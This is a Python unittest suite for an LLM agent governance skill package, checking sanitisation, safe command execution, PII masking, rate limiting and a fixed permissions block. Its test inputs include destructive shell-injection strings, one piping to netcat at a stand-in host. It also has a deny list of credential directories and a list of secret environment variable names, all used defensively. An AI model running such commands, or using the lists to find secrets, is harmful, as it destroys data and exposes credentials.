#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""test-method-patterns.py — self-check suite for the micro-tier LLM Agent governance skill package (four assertion classes).

A. Behaviour tests     — extract the ```python code blocks of section 3 (Shared Code Templates)
                   in references/method-patterns.md, exec them into an isolated namespace and call them.
                   This tests the authoritative source, not an inline copy (keeps contract, code and tests from drifting apart).
B. Source integrity — the authoritative source exists, all 10 defs are present, [PHONE] is in the source, templates.md must not exist.
C. Structural consistency — function-block conservation (micro=18), the four scaling files, the 13 governance files,
                   prompt constraints, language_policy, and SKILL.md staying index-only.
D. Immutable boundary — an upgrade package must not modify tests/ or change the permissions block.

Run with: python tests/test-method-patterns.py   (the exit code propagates: all green = 0)
Standard library only. Always use datetime.now(timezone.utc) (utcnow is deprecated).
"""

import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import time
import unittest
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path

# ─────────────────────────────────────────────────────────────────────────────
# Package parameters (micro tier). SKILL_DIR is derived relatively from the test-file location; hardcoded absolute paths are forbidden.
# ─────────────────────────────────────────────────────────────────────────────
SKILL_DIR = Path(__file__).resolve().parent.parent
WORKSPACE_ROOT = SKILL_DIR.parent  # the real root behind the {WORKSPACE_ROOT} placeholder

SCALE_TIER = "small"
SKILL_VERSION = "2.0.0"

AUTHORITATIVE_SOURCE = "references/method-patterns.md"  # ★ the single authoritative source
LEGACY_TEMPLATES_FILE = "references/templates.md"       # cancelled by R3-2; must not exist

# 3.1-3.10 are order-fixed and must never be reordered
TEN_TEMPLATE_NAMES = [
    "validate_input_schema",
    "sanitize_user_query",
    "execute_safe_command",
    "format_output_json",
    "retry_with_backoff",
    "read_reference_file",
    "generate_trace_id",
    "check_rate_limit",
    "mask_sensitive_data",
    "build_prompt_from_template",
]

# §7.1 exact signatures of the ten templates (H3 requires a human-paste prompt to carry this list)
TEN_TEMPLATE_SIGNATURES = [
    "validate_input_schema(data, schema)",
    "sanitize_user_query(query)",
    "execute_safe_command(cmd, timeout=30)",
    "format_output_json(content, provider)",
    "retry_with_backoff(func, max_retries=3)",
    "read_reference_file(filepath)",
    'generate_trace_id(prefix="trace")',
    "check_rate_limit(identifier, limit=10, window=60)",
    "mask_sensitive_data(text)",
    "build_prompt_from_template(template, **kwargs)",
]

# Function-block conservation (README-FOR-AI.md §10.1): XS/S/M/L = 18, G = 36
EXPECTED_FB_BY_TIER = {"micro": 18, "small": 18, "medium": 18, "large": 18, "group": 36}
EXPECTED_FB_TOTAL = EXPECTED_FB_BY_TIER[SCALE_TIER]
# Function blocks per department at the small tier (micro→small split;
# G4-verified distribution: 6+2+3+3+4 = 18 conserved)
EXPECTED_DEPARTMENT_BLOCKS = {
    "governance-and-operations.md": 6,
    "quality-and-delivery.md": 2,
    "technology-and-platform.md": 3,
    "security-and-compliance.md": 3,
    "people-and-growth.md": 4,
}

# Error-code catalog distribution after the micro→small prefix revival
# (CEO_/CTO_ codes redistributed to the revived CISO_/CHO_/CQO_ prefixes).
EXPECTED_CODES_BY_PREFIX = {
    "CEO_": 9,    # governance-and-operations
    "CTO_": 4,    # technology-and-platform
    "CISO_": 4,   # security-and-compliance
    "CHO_": 4,    # people-and-growth
    "CQO_": 3,    # quality-and-delivery
    "SCL_": 10,   # infrastructure (unchanged)
}

# The 13 governance and community files (R3-7: 12 to 13 after review); case must match the spec exactly
GOVERNANCE_FILES = [
    ".editorconfig", ".gitignore", "AGENTS.md", "CHANGELOG.md", "CODE_OF_CONDUCT.md",
    "CONTRIBUTING.md", "LICENSE", "README.en.md", "README.md", "README.zh.md",
    "SECURITY.md", "SKILL.md", "_meta.json",
]

# README-FOR-AI.md §9.1 permissions declaration (copied character-for-character; self-upgrade may not change it) — the D-class baseline
BASELINE_PERMISSIONS = [
    "files:",
    'read: ["{WORKSPACE_ROOT}/**", "{SKILL_DIR}/**"]',
    'write: ["{WORKSPACE_ROOT}/**"]',
    'deny: ["~/.ssh/**", "~/.aws/**", "~/.config/**", "/etc/**", "{WINDOWS_DIR}/**"]',
    "network: []",
    "commands: []",
    "mcp: [sessions_send, subagents]",
]

FB_HEADING_RE = re.compile(r"(?m)^## FB-\d+:")
PYTHON_BLOCK_RE = re.compile(r"```python[ \t]*\r?\n(.*?)```", re.DOTALL)
HEADING_RE = re.compile(r"^(#{1,6})\s*(.*)$")

# ─────────────────────────────────────────────────────────────────────────────
# 2026-10-14 initial-review (H-1..H-4 / M-1..M-4) regression line: shared helpers for the package file set and doc anchors.
# Package file set boundary = every file outside the repository tooling directories and build residue (README-FOR-AI.md §3);
# it keeps the same basis as $ExcludedDirSegments / Get-PackageRelativePaths in
# scripts/self-scale.ps1.
# ─────────────────────────────────────────────────────────────────────────────
PACKAGE_EXCLUDED_DIRS = {".git", ".github", ".workbuddy", ".skill-upgrade"}


def package_relative_paths(root=SKILL_DIR):
    """Package file set: files under root that are package content, as posix relative paths, sorted."""
    out = []
    for path in Path(root).rglob("*"):
        if not path.is_file():
            continue
        rel = path.relative_to(root).as_posix()
        parts = rel.split("/")
        if parts[0] in PACKAGE_EXCLUDED_DIRS:
            continue
        if "__pycache__" in parts:
            continue
        if rel.endswith(".pyc"):
            continue
        out.append(rel)
    return sorted(out)


def readme_tree_paths(doc="README.md"):
    """Parse the README Project Structure code block and return the relative paths it lists."""
    text = (SKILL_DIR / doc).read_text(encoding="utf-8")
    m = re.search(r"```text\n(.*?)```", text, re.S)
    if not m:
        return []
    out, stack = [], []
    for line in m.group(1).splitlines()[1:]:
        if not line.strip():
            continue
        prefix = line[: len(line) - len(line.lstrip(" │├└─"))]
        name = line.strip()
        if " #" in name:
            name = name.split(" #")[0].rstrip()
        name = re.sub(r"^[\s│├└─]+", "", name)
        name = re.sub(r"[\s│├└─]+$", "", name).strip()
        if not name:
            continue
        depth = max(0, len(prefix.replace("│", " ")) // 4 - 1)
        if name.endswith("/"):
            stack = stack[:depth]
            stack.append(name[:-1])
        else:
            out.append("/".join(stack[:depth] + [name]))
    return sorted(out)


def markdown_sections(path):
    """Collect the section numbers declared by level 2-4 headings (e.g. '3', '3.1'), skipping code blocks."""
    text = (SKILL_DIR / path).read_text(encoding="utf-8")
    in_fence = False
    sections = set()
    for line in text.splitlines():
        if line.lstrip().startswith("```"):
            in_fence = not in_fence
            continue
        if in_fence:
            continue
        m = re.match(r"^#{2,4}\s+(\d+(?:\.\d+)*)[\.\s、:：]", line)
        if m:
            sections.add(m.group(1))
    return sections


# ─────────────────────────────────────────────────────────────────────────────
# Helper functions (standard library only)
# ─────────────────────────────────────────────────────────────────────────────
def parse_frontmatter(path):
    """Parse the YAML frontmatter line by line (between the two '---'), supporting one level of nested dict.

    No external dependency; values are stripped of surrounding quotes. Enough for language_policy / metadata assertions.
    """
    text = Path(path).read_text(encoding="utf-8")
    lines = text.splitlines()
    if not lines or lines[0].strip() != "---":
        return {}
    fm = {}
    current_top = None
    in_fm = False
    for line in lines[1:]:
        stripped = line.strip()
        if stripped == "---":
            break
        if not in_fm:
            in_fm = True
        if not stripped or stripped.startswith("#"):
            continue
        if re.match(r"^\s", line):  # nested key (one level)
            m = re.match(r"^\s+([A-Za-z0-9_.-]+)\s*:\s*(.*)$", line)
            if m and current_top is not None:
                key, value = m.group(1), m.group(2).strip().strip('"').strip("'")
                fm.setdefault(current_top, {})
                if isinstance(fm[current_top], dict):
                    fm[current_top][key] = value
            continue
        m = re.match(r"^([A-Za-z0-9_.-]+)\s*:\s*(.*)$", line)
        if not m:
            continue
        key, value = m.group(1), m.group(2).strip()
        if value == "":
            fm[key] = {}
            current_top = key
        else:
            fm[key] = value.strip('"').strip("'")
            current_top = None
    return fm


def extract_permissions_block(path):
    """Return the permissions: block of SKILL.md (up to the next top-level key) as a list of stripped lines."""
    text = Path(path).read_text(encoding="utf-8")
    lines = text.splitlines()
    block = []
    in_block = False
    for line in lines:
        if re.match(r"^permissions:\s*(\{.*\})?\s*$", line):
            inline = re.match(r"^permissions:\s*(\{.*\})\s*$", line)
            if inline:
                return [inline.group(1)]
            in_block = True
            continue
        if not in_block:
            continue
        if line.strip() == "":
            continue
        if re.match(r"^\S", line):  # next top-level key (including the closing '---')
            break
        block.append(line.strip())
    return block


def _stdout_of(result):
    """Best-effort extraction of stdout text from the common return shapes (str / dict / tuple / CompletedProcess)."""
    if result is None:
        return ""
    if isinstance(result, bytes):
        return result.decode("utf-8", "replace")
    if isinstance(result, str):
        return result
    if isinstance(result, dict):
        for key in ("stdout", "output", "out", "result", "stdout_text"):
            value = result.get(key)
            if isinstance(value, bytes):
                return value.decode("utf-8", "replace")
            if isinstance(value, str):
                return value
        return json.dumps(result, ensure_ascii=False, default=str)
    if isinstance(result, tuple):
        for item in result:
            if isinstance(item, bytes) and item:
                return item.decode("utf-8", "replace")
            if isinstance(item, str) and item:
                return item
        return ""
    out = getattr(result, "stdout", None)
    if isinstance(out, bytes):
        return out.decode("utf-8", "replace")
    if isinstance(out, str):
        return out
    return str(result)


def load_template_namespace():
    """Extract the ```python code blocks of section 3 (Shared Code Templates) from method-patterns.md,
    exec them into an isolated namespace and return it. This tests the source file, not an inline copy.
    """
    src = SKILL_DIR / AUTHORITATIVE_SOURCE
    text = src.read_text(encoding="utf-8")
    lines = text.splitlines()

    # Collect headings (skipping fenced code blocks — a '#' comment line is not a heading)
    headings = []  # (line index, level, title)
    in_fence = False
    for i, line in enumerate(lines):
        if line.lstrip().startswith("```"):
            in_fence = not in_fence
            continue
        if in_fence:
            continue
        m = HEADING_RE.match(line)
        if m:
            headings.append((i, len(m.group(1)), m.group(2).strip()))

    # Locate the section-3 heading (prefer the numbered form "## 3. Shared Code Templates" to
    # avoid matching a document title that contains the same phrase)
    candidates = [(i, lvl) for i, lvl, title in headings
                  if re.match(r"^3[\.\s、:：]", title)]
    if not candidates:
        candidates = [(i, lvl) for i, lvl, title in headings
                      if "shared code templates" in title.lower() and lvl >= 2]
    if not candidates:
        raise AssertionError(
            f"{AUTHORITATIVE_SOURCE} has no section 3 (Shared Code Templates) heading"
        )
    start_idx, level = min(candidates, key=lambda c: (c[1], c[0]))

    # Section boundary: the next heading of the same or higher level (also skipping code blocks)
    end_idx = len(lines)
    for i, lvl, _title in headings:
        if i > start_idx and lvl <= level:
            end_idx = i
            break

    section = "\n".join(lines[start_idx:end_idx])
    blocks = PYTHON_BLOCK_RE.findall(section)
    if not blocks:
        raise AssertionError(
            f"{AUTHORITATIVE_SOURCE} section 3 contains no ```python code block"
        )

    ns = {"__name__": "method_patterns_source", "__file__": str(src)}
    for mod in ("re", "json", "time", "os", "sys", "subprocess", "uuid", "hashlib",
                "random", "string", "collections", "functools", "math", "tempfile",
                "shutil", "typing"):
        try:
            ns[mod] = __import__(mod)
        except ImportError:
            pass
    ns["datetime"] = datetime
    ns["timezone"] = timezone
    ns["Path"] = Path
    for block in blocks:
        try:
            exec(compile(block, str(src), "exec"), ns)
        except SyntaxError as exc:
            offending = ""
            if exc.lineno and 0 < exc.lineno <= len(block.splitlines()):
                offending = block.splitlines()[exc.lineno - 1].strip()
            raise AssertionError(
                f"{AUTHORITATIVE_SOURCE} section 3 code block has a syntax error"
                f" (block line {exc.lineno}: {exc.msg}; {offending})"
                f" — authoritative-source defect; fix method-patterns.md"
            ) from exc
    return ns


# ═════════════════════════════════════════════════════════════════════════════
# A. Behaviour tests (at least one per template: normal path + boundary)
# ═════════════════════════════════════════════════════════════════════════════
class BehaviorTests(unittest.TestCase):
    """Behaviour tests for the 10 templates in the authoritative source (exec the source, then call)."""

    @classmethod
    def setUpClass(cls):
        # ★ E22: pin the sandbox root explicitly, removing the implicit dependency on CWD.
        # method-patterns.md reads SKILL_ROOT = os.environ.get("SKILL_DIR", ".")
        # / WORKSPACE_ROOT = os.environ.get("WORKSPACE_ROOT", ".") at module level,
        # falling back to "." (the current working directory) — so the env vars must be set before loading the namespace.
        os.environ.setdefault("SKILL_DIR", str(SKILL_DIR))
        os.environ.setdefault("WORKSPACE_ROOT", str(WORKSPACE_ROOT))
        cls.ns = load_template_namespace()
        missing = [n for n in TEN_TEMPLATE_NAMES if not callable(cls.ns.get(n))]
        if missing:
            raise AssertionError(
                f"{AUTHORITATIVE_SOURCE} section 3 is missing template implementations: {missing}"
            )

    def _fn(self, name):
        fn = self.ns.get(name)
        self.assertTrue(callable(fn), f"template {name} is not callable")
        return fn

    # ── 1. validate_input_schema: valid input passes / invalid input is rejected ──────────────────
    def test_validate_input_schema(self):
        fn = self._fn("validate_input_schema")
        # Probe which schema dialect the implementation speaks, then assert pass/reject under that dialect
        dialects = [
            ({"name": {"type": str, "required": True},
              "age": {"type": int, "required": False}},
             {"name": 12345, "age": "twenty"}),
            ({"name": {"type": str}, "age": {"type": int}},
             {"name": 12345, "age": "twenty"}),
            ({"name": {"type": "string"}, "age": {"type": "integer"}},
             {"name": 12345, "age": "twenty"}),
            ({"name": {"type": "str"}, "age": {"type": "int"}},
             {"name": 12345, "age": "twenty"}),
            ({"name": str, "age": int}, {"name": 12345, "age": "twenty"}),
            ({"name": "str", "age": "int"}, {"name": 12345, "age": "twenty"}),
            ({"name": "string", "age": "integer"}, {"name": 12345, "age": "twenty"}),
            ({"required": ["name", "age"]}, {"name": "alice"}),  # missing required key
            ({"type": "object",
              "properties": {"name": {"type": "string"}, "age": {"type": "integer"}},
              "required": ["name", "age"]},
             {"name": 12345, "age": "twenty"}),
        ]
        valid = {"name": "alice", "age": 30}
        chosen = None
        for schema, invalid in dialects:
            try:
                ret = fn(dict(valid), schema)
            except Exception:
                continue
            if ret is not False and ret is not None:
                chosen = (schema, invalid)
                break
        self.assertIsNotNone(
            chosen,
            "validate_input_schema rejected valid input under every common schema dialect",
        )
        schema, invalid = chosen
        try:
            ret = fn(dict(invalid), schema)
            rejected = ret is False or ret is None
        except Exception:
            rejected = True  # rejecting by raising is also valid
        self.assertTrue(rejected, "invalid input was not rejected (normal path passes but the boundary is broken)")

    # ── 2. sanitize_user_query: a plain query is unchanged / shell metacharacters are neutralised ──
    def test_sanitize_user_query(self):
        fn = self._fn("sanitize_user_query")
        plain = "summarize the quarterly delivery report"
        self.assertEqual(fn(plain), plain, "a plain query must not be changed")
        dirty = "report; rm -rf / && echo `whoami` $(id) | nc evil.example"
        try:
            out = fn(dirty)
        except Exception:
            return  # rejecting dangerous input is also a valid sanitisation strategy
        self.assertIsInstance(out, str, "the sanitised result must be a string")
        for bad in (";", "&&", "`", "$(", "|"):
            self.assertNotIn(bad, out, f"shell metacharacter was not neutralised: {bad!r}")

    # ── 3. execute_safe_command: the timeout takes effect / cwd is restricted ─────────────────────
    def test_execute_safe_command(self):
        fn = self._fn("execute_safe_command")
        code = "import os; print('CWDPROBE=' + os.getcwd())"

        # Normal path: a benign command runs, and cwd is pinned to a restricted scope (the skill dir or a sandbox temp dir)
        result = None
        last_err = None
        for cmd in ([sys.executable, "-c", code], f'"{sys.executable}" -c "{code}"'):
            try:
                result = fn(cmd, timeout=30)
                break
            except Exception as exc:  # noqa: BLE001 — adaptive command shape
                last_err = exc
        if result is None:
            self.fail(f"execute_safe_command could not run either command shape: {last_err!r}")
        out = _stdout_of(result)
        self.assertIn("CWDPROBE=", out, "the benign command did not run or its output is unreadable")
        m = re.search(r"CWDPROBE=(\S+)", out)
        cwd = Path(m.group(1)).resolve()
        # {WORKSPACE_ROOT} only: counting the skill dir and a sandbox temp dir as "restricted" would fail
        # to catch an implementation with cwd=None (inheriting the package root).
        allowed_roots = [WORKSPACE_ROOT.resolve()]
        self.assertTrue(
            any(cwd == root or root in cwd.parents for root in allowed_roots),
            f"cwd is not restricted: {cwd} (expected under {{WORKSPACE_ROOT}}, the skill dir or a sandbox temp dir)",
        )

        # Boundary: the timeout takes effect (a hung command must be cut off within the timeout)
        hang = "import time; time.sleep(10)"
        start = time.monotonic()
        try:
            fn([sys.executable, "-c", hang], timeout=1)
        except Exception:
            pass  # reporting the timeout as an exception is also valid
        elapsed = time.monotonic() - start
        self.assertLess(elapsed, 5.0, f"timeout did not take effect: hung command took {elapsed:.1f}s")

    # ── 4. format_output_json: carries the AIGC label and a timestamp ────────────────────────────
    def test_format_output_json(self):
        fn = self._fn("format_output_json")
        now = datetime.now(timezone.utc)
        res = fn("Quarterly summary content", "test-provider")
        if isinstance(res, bytes):
            res = res.decode("utf-8", "replace")
        if isinstance(res, dict):
            data, text = res, json.dumps(res, ensure_ascii=False, default=str)
        elif isinstance(res, str):
            text = res
            try:
                data = json.loads(res)
            except ValueError:
                brace = re.search(r"\{.*\}", res, re.DOTALL)
                try:
                    data = json.loads(brace.group(0)) if brace else None
                except ValueError:
                    data = None
        else:
            data, text = None, str(res)
        # Standard JSON (structured, or a parseable JSON string)
        self.assertIsInstance(data, dict, "the output must be a valid JSON object")
        # AIGC labels (explicit declaration or metadata fields)
        self.assertRegex(
            text, r"(?i)ai[-_ ]?generated",
            "the output is missing the AIGC label",
        )
        if isinstance(data, dict):
            self.assertIs(data.get("ai_generated"), True,
                          "structured output should carry ai_generated: true metadata")
            ts = data.get("generated_at") or data.get("timestamp") or data.get("created_at")
            if isinstance(ts, str):
                self.assertRegex(ts, r"\d{4}-\d{2}-\d{2}", "the timestamp must be ISO8601")
        else:
            self.assertRegex(text, r"\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}",
                             "the output is missing a timestamp")
        self.assertIn("Quarterly summary content", text, "the content body was lost")
        self.assertIn("test-provider", text, "the provider information was lost")
        # The timestamp must not be ahead of the current moment (UTC basis)
        ts_match = re.search(r"(\d{4}-\d{2}-\d{2})[T ](\d{2}:\d{2})", text)
        if ts_match:
            try:
                stamp = datetime.strptime(
                    f"{ts_match.group(1)} {ts_match.group(2)}", "%Y-%m-%d %H:%M"
                ).replace(tzinfo=timezone.utc)
                self.assertLessEqual(
                    stamp, now + timedelta(minutes=5),
                    "the timestamp is ahead of the current UTC time",
                )
            except ValueError:
                pass
        # Boundary: non-ASCII content does not crash
        out2 = fn("café — résumé", "test-provider")
        self.assertIn("café — résumé", _stdout_of(out2) if not isinstance(out2, (str, dict)) else (
            out2 if isinstance(out2, str) else json.dumps(out2, ensure_ascii=False, default=str)
        ))

    # ── 5. retry_with_backoff: retries succeed after a transient failure / raises at the limit ───
    def test_retry_with_backoff_success_after_transient_failure(self):
        fn = self._fn("retry_with_backoff")
        last_err = None
        for exc_type in (ValueError, ConnectionError, TimeoutError, RuntimeError):
            calls = {"n": 0}

            def flaky(_exc=exc_type, _calls=calls):
                _calls["n"] += 1
                if _calls["n"] == 1:
                    raise _exc("transient failure")
                return "recovered"

            try:
                ret = fn(flaky, max_retries=3)
            except Exception as exc:  # noqa: BLE001
                last_err = exc
                continue
            self.assertEqual(ret, "recovered", "a successful retry should return the function result")
            self.assertGreaterEqual(calls["n"], 2, "no retry happened after the first failure")
            return
        self.fail(
            f"the retry did not succeed after the first failure (every exception type raised straight through; last: {last_err!r})"
        )

    def test_retry_with_backoff_raises_after_limit(self):
        fn = self._fn("retry_with_backoff")
        for exc_type in (ValueError, ConnectionError, TimeoutError, RuntimeError):
            calls = {"n": 0}

            def boom(_exc=exc_type, _calls=calls):
                _calls["n"] += 1
                raise _exc("permanent failure")

            try:
                fn(boom, max_retries=2)
            except Exception:
                if calls["n"] >= 2:
                    self.assertLessEqual(calls["n"], 3, "the number of retries exceeded the limit")
                    return
                continue  # this exception type is not retried; try another type
            if calls["n"] >= 2:
                self.fail("reaching the retry limit should raise, not return silently")
                return
            continue
        self.fail("never observed the 'raise after retries still fail' behaviour")

    # ── 6. read_reference_file: allowed paths are readable / out-of-bounds paths are rejected ─────
    def test_read_reference_file(self):
        fn = self._fn("read_reference_file")

        # Normal path: a read-only assertion — read a real file that already exists in the package (no probe is written,
        # so an interruption leaves no file polluting the package tree), and its content must match a direct read character for character
        candidates = ["references/error-codes.md", "references/scaling.md",
                      "references/method-patterns.md"]
        existing = [c for c in candidates if (SKILL_DIR / c).is_file()]
        self.assertTrue(existing, "references/ has no real file usable for the read-only assertion")
        read_ok = False
        for rel in existing:
            expected = (SKILL_DIR / rel).read_text(encoding="utf-8")
            try:
                out = fn(rel)
            except Exception:
                continue
            if isinstance(out, str) and out == expected:
                read_ok = True
                break
        self.assertTrue(read_ok, "an allowed path (a real file under references/) should be readable with identical content")

        # Boundary: an out-of-bounds path must raise PermissionError (a read-only probe, nothing written to disk).
        # The old form was 'fail only if the content contains the first 200 characters of an outside file', but the probe
        # target WORKSPACE_ROOT/README-FOR-AI.md does not exist, so secret_head was always empty and rejected was
        # always True — a permanently vacuous assertion (README-FOR-AI.md §13/§14.5).
        temp_outside = Path(tempfile.gettempdir()).resolve() / "oob-probe.md"
        rel_outside = os.path.relpath(temp_outside, SKILL_DIR)
        probes = ["../outside.md", str(temp_outside),
                  rel_outside, rel_outside.replace("\\", "/")]
        for p in probes:
            with self.assertRaises(PermissionError, msg=f"out-of-bounds path was not rejected: {p}"):
                fn(p)

    # ── 7. generate_trace_id: default prefix / custom prefix / uniqueness ────────────────────────
    def test_generate_trace_id(self):
        fn = self._fn("generate_trace_id")
        default = fn()
        self.assertIsInstance(default, str, "a trace id must be a string")
        self.assertTrue(default.lower().startswith("trace"),
                        "the default prefix should be trace")
        custom = fn(prefix="req")
        self.assertTrue(custom.lower().startswith("req"),
                        "the custom prefix should take effect")
        self.assertNotEqual(default, custom)
        ids = {fn() for _ in range(50)}
        self.assertEqual(len(ids), 50, "trace ids must be unique (a duplicate appeared in 50 calls)")

    # ── 8. check_rate_limit: passes within the window / rejects past the limit ───────────────────
    def test_check_rate_limit(self):
        fn = self._fn("check_rate_limit")

        def allowed(identifier, limit, window):
            try:
                ret = fn(identifier, limit=limit, window=window)
            except Exception:
                return False  # raising on over-limit is also a rejection
            return ret is not False and ret is not None

        ident = "test-rate-" + uuid.uuid4().hex
        for _ in range(3):
            self.assertTrue(allowed(ident, 3, 60), "within the window (below limit) should pass")
        self.assertFalse(allowed(ident, 3, 60), "past the limit should be rejected")

    # ── 9. mask_sensitive_data: email / IP / phone are all masked ────────────────────────────────
    def test_mask_sensitive_data(self):
        fn = self._fn("mask_sensitive_data")
        text = ("Contact john.doe@example.com from 192.168.1.100 "
                "or call 13812345678 today")
        out = fn(text)
        self.assertIsInstance(out, str)
        cases = [
            ("john.doe@example.com", "[EMAIL]"),
            ("192.168.1.100", "[IP]"),
            ("13812345678", "[PHONE]"),
        ]
        for raw, label in cases:
            self.assertNotIn(raw, out, f"sensitive data was not masked: {raw}")
            self.assertIn(label, out, f"missing masking placeholder: {label}")
        # Boundary: text without PII is unchanged
        clean = "No sensitive data here, ticket 12345."
        self.assertEqual(fn(clean), clean, "text without PII must not be changed")

    # ── 10. build_prompt_from_template: template filling / inputs are sanitised ──────────────────
    def test_build_prompt_from_template(self):
        fn = self._fn("build_prompt_from_template")
        tmpl = None
        for candidate in (
            "Summarize the following topic: {topic}",
            "Summarize the following topic: {{topic}}",
            "Summarize the following topic: $topic",
            "Summarize the following topic: <topic>",
        ):
            try:
                out = fn(candidate, topic="AI governance")
            except Exception:
                continue
            if isinstance(out, str) and "AI governance" in out:
                tmpl = candidate
                break
        self.assertIsNotNone(tmpl, "template filling failed: no common placeholder syntax took effect")
        # Boundary: kwargs inputs are sanitised first (reject or strip metacharacters, either is valid)
        try:
            out2 = fn(tmpl, topic="safe; rm -rf / `whoami`")
        except Exception:
            return  # rejecting dangerous input is also a valid sanitisation strategy
        self.assertIsInstance(out2, str)
        for bad in (";", "`"):
            self.assertNotIn(bad, out2, f"kwargs input was not sanitised: {bad!r}")

    # ══ ★ R4 regression: 2026-09-28 substantive-review defects (H-2 / M-2 / M-4 / L-3 / L-4 / L-6) ══
    # These defects share one trait: the checklist review passed while the mechanism did not work. So every
    # assertion calls the real function in the authoritative source instead of re-checking document wording.

    def test_credential_env_scrubbing_covers_real_names(self):
        """★ H-2: credential scrubbing must cover real-world variable names, not just prefixes.

        Prefix matching (api_/token/secret/password/key_) was measured leaking AWS_SECRET_ACCESS_KEY,
        GITHUB_TOKEN, OPENAI_APIKEY and 9 more names — none of them start with a blocked prefix.
        """
        is_secret = self._fn("_is_secret_env_name")
        leaked = [
            "AWS_SECRET_ACCESS_KEY", "AWS_ACCESS_KEY_ID", "GITHUB_TOKEN",
            "GH_TOKEN", "OPENAI_APIKEY", "ANTHROPIC_AUTH_TOKEN", "CREDENTIAL",
            "PRIVATE_KEY", "SESSION_ID", "PASSWD", "NPM_TOKEN", "HF_TOKEN",
        ]
        missed = [n for n in leaked if not is_secret(n)]
        self.assertEqual([], missed, f"credential names were not scrubbed (H-2 recurrence): {missed}")
        # Reverse check: harmless variables must not be wiped too, or the child process cannot work
        benign = [
            "PATH", "HOME", "LANG", "TERM", "USER", "TMP", "TEMP", "SYSTEMROOT",
            "COMSPEC", "PROGRAMFILES", "APPDATA", "PYTHONPATH", "VIRTUAL_ENV",
            "HTTP_PROXY", "NUMBER_OF_PROCESSORS", "PROCESSOR_IDENTIFIER",
            "PATHEXT", "OS", "EDITOR",
        ]
        over = [n for n in benign if is_secret(n)]
        self.assertEqual([], over, f"harmless variables were wrongly scrubbed: {over}")

    def test_mask_phone_number_variants(self):
        """★ M-2: phone masking must not cover only the '11 consecutive digits' form."""
        fn = self._fn("mask_sensitive_data")
        variants = [
            "13800138000", "+8613800138000", "138-0013-8000",
            "+86 138 0013 8000", "0086 13800138000", "138 0013 8000",
        ]
        for raw in variants:
            out = fn(f"call {raw} now")
            self.assertEqual(
                "call [PHONE] now", out,
                f"phone form {raw!r} was not fully masked (M-2 recurrence): {out!r}",
            )

    def test_execute_safe_command_non_utf8_output_not_lost(self):
        """★ M-4: non-UTF-8 output must not silently become None (always the case on Chinese Windows with GBK)."""
        fn = self._fn("execute_safe_command")
        # 0xB2 is an invalid UTF-8 start byte (a typical first byte of GBK Chinese). Raw bytes are required:
        # an ASCII probe never triggers a decode failure, so the assertion would be permanently vacuous.
        code = "import sys; sys.stdout.buffer.write(bytes([0xB2, 0x41, 0x42]))"
        try:
            res = fn([sys.executable, "-c", code], timeout=30)
        except Exception as exc:  # noqa: BLE001 — skip when no command shape is usable
            self.skipTest(f"cannot run the probe command: {exc!r}")
            return
        out = res.get("stdout") if isinstance(res, dict) else getattr(res, "stdout", None)
        self.assertIsNotNone(out, "non-UTF-8 output silently lost (M-4 recurrence): stdout=None")
        self.assertNotEqual("", out, "non-UTF-8 output was dropped to an empty string (M-4 recurrence)")

    def test_format_output_json_model_field(self):
        """★ L-4: the model field must be <provider/model> and must not append /default twice."""
        fn = self._fn("format_output_json")

        def model_of(res):
            if isinstance(res, bytes):
                res = res.decode("utf-8", "replace")
            data = res if isinstance(res, dict) else None
            if data is None:
                try:
                    data = json.loads(res)
                except ValueError:
                    m = re.search(r"\{.*\}", str(res), re.DOTALL)
                    try:
                        data = json.loads(m.group(0)) if m else None
                    except ValueError:
                        data = None
            return data.get("model") if isinstance(data, dict) else None

        self.assertEqual("openai/gpt-4", model_of(fn("x", "openai/gpt-4")),
                         "provider containing /model was wrongly given an extra /default (L-4 recurrence)")
        self.assertEqual("acme/default", model_of(fn("x", "acme")),
                         "provider without /model should get /default appended")

    def test_check_rate_limit_memory_bounded(self):
        """★ L-3: the number of identifiers must be bounded; a long run must not grow without bound."""
        fn = self._fn("check_rate_limit")
        cap = self.ns.get("_MAX_RATE_IDENTIFIERS")
        buckets = self.ns.get("_rate_buckets")
        if not isinstance(cap, int) or not hasattr(buckets, "__len__"):
            self.fail(
                "the authoritative source declares no rate-limiter bound (L-3 recurrence): deleting a guarded symbol must not skip the assertion"
            )
        for _ in range(cap + 500):
            fn("bounded-" + uuid.uuid4().hex, limit=10, window=60)
        self.assertLessEqual(
            len(buckets), cap,
            f"the number of rate-limiter identifiers exceeds the bound (L-3 recurrence): {len(buckets)} > {cap}",
        )

    def test_read_reference_file_fails_closed_without_root(self):
        """★ L-6: with {SKILL_DIR} unset, reading must be refused, not fall back to the current working directory."""
        fn = self._fn("read_reference_file")
        flag = "SKILL_ROOT_CONFIGURED"
        if flag not in self.ns:
            self.fail(
                "the authoritative source declares no SKILL_ROOT_CONFIGURED (L-6 fail-closed recurrence):"
                "deleting a guarded symbol must not skip the assertion"
            )
        saved = self.ns[flag]
        self.ns[flag] = False
        try:
            with self.assertRaises(PermissionError):
                fn("references/scaling.md")
        finally:
            self.ns[flag] = saved


# ═════════════════════════════════════════════════════════════════════════════
# B. Source integrity tests (key: keep contract/code/tests from drifting apart)
# ═════════════════════════════════════════════════════════════════════════════
class SourceIntegrityTests(unittest.TestCase):
    """Assert the authoritative template source exists and is complete — the test tests the source file, not an inline copy."""

    def test_templates_source_exists(self):
        """Assert the authoritative template file exists and contains all 10 function definitions"""
        src = SKILL_DIR / AUTHORITATIVE_SOURCE
        self.assertTrue(src.exists(), f"authoritative template source missing: {src}")
        content = src.read_text(encoding="utf-8")
        for fn_name in TEN_TEMPLATE_NAMES:
            self.assertIn(f"def {fn_name}", content,
                          f"template {fn_name} is missing from the authoritative source")

    def test_phone_masking_in_source(self):
        """Assert the authoritative source contains the PHONE implementation — keeps contract/code/tests from drifting apart"""
        src = SKILL_DIR / AUTHORITATIVE_SOURCE
        self.assertTrue(src.exists(), f"authoritative template source missing: {src}")
        content = src.read_text(encoding="utf-8")
        self.assertIn("[PHONE]", content, "the authoritative source is missing the PHONE masking implementation")

    def test_legacy_templates_file_absent(self):
        """★ R3 addition: assert the cancelled templates.md does not exist, preventing a dual authoritative source"""
        legacy = SKILL_DIR / LEGACY_TEMPLATES_FILE
        self.assertFalse(legacy.exists(), "templates.md was cancelled (R3-2) and must not be generated")

    def test_def_unique_across_package(self):
        """★ R4 addition: assert every def <fn> appears exactly once across the package (P10/P44 recurrence signal).

